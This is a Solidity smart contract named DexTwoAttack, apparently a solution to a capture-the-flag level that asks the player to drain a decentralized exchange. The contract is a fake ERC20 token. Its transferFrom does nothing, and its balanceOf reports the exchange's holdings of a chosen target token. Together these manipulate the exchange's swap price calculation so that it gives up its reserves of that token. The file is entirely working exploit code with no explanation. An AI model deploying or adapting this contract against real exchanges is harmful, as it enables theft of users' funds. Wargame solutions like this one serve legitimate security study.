// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/token/ERC20/IERC20.sol";
import "@openzeppelin/token/ERC20/ERC20.sol";

contract DexTwoAttack is ERC20 {
    address dexAddress;
    address targetToken;

    constructor(address _dexAddress, address _playerAddress) ERC20("DexTwoAttack", "D2A") {
        _mint(_playerAddress, 1000069);
        dexAddress = _dexAddress;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        // do nothing lol
    }

    function tokenToDrain(address _targetToken) public {
        targetToken = _targetToken;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (account == dexAddress) {
            return IERC20(targetToken).balanceOf(account);
        }
        return super.balanceOf(account);
    }
}
